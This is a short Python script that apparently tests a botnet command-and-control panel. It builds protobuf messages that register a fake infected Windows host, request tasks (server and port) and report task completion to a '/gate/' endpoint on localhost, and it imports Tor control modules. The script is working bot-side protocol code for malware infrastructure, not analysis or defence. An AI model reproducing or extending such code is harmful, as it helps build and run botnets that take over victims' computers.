import requests

import bot_pb2
import struct
from io import StringIO
from stem import Signal
from stem.control import Controller
import urllib3


hash = '16:159C137829EB08E660D8A30A6B5DAB55167C2465231B40440FDB12591A'



bot = bot_pb2.BotMsg.RegisterBot()
bot.uid = 'ruserv1'.encode('utf-16-le')
bot.computername = '12dczczc3'.encode('utf-16-le')
bot.username = '1232czc3'.encode('utf-16-le')
bot.os_major = 6
bot.os_minor = 2
bot.is_x64 = True
bot.is_server = False


#r = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 1) + bot.SerializeToString())
#print(r.content)

#_r = bot_pb2.PanelMsg.RegistrationResult()
#_r.ParseFromString(r.content)
#print(_r)


def create_bot():
    bot = bot_pb2.BotMsg.RegisterBot()
    bot.uid = 'win7'.encode('utf-16-le')
    bot.computername = '12dczczc3'.encode('utf-16-le')
    bot.username = '1232czc3'.encode('utf-16-le')
    bot.os_major = 6
    bot.os_minor = 1
    bot.is_x64 = True
    bot.is_server = False

    r = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 1) + bot.SerializeToString())
    print(r.content)

    _r = bot_pb2.PanelMsg.RegistrationResult()
    _r.ParseFromString(r.content)
    print(_r)



def activity_report():

    ar = bot_pb2.BotMsg.ActivityReport()
    ar.uid = 'win7'.encode('utf-16-le')

    r1 = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 2) + ar.SerializeToString())
    b = bot_pb2.PanelMsg.TaskGiveaway()

    b.ParseFromString(r1.content)
    print(b.is_empty, b.task.task_id.decode('utf-16-le'), b.task.server, b.task.port, 'activ rep')

#---------------------------------------------


def task_completed():

    task = bot_pb2.BotMsg.TaskCompleted()
    task.task_id = '56'.encode('utf-16-le')
    task.result = True
    task.uid = 'ruserv1'.encode('utf-16-le')

    r2 = requests.post(url='http://127.0.0.1:8000/gate/', data=struct.pack('=I', 3) + task.SerializeToString())
    print(r2.text)

#create_bot()
task_completed()
#activity_report()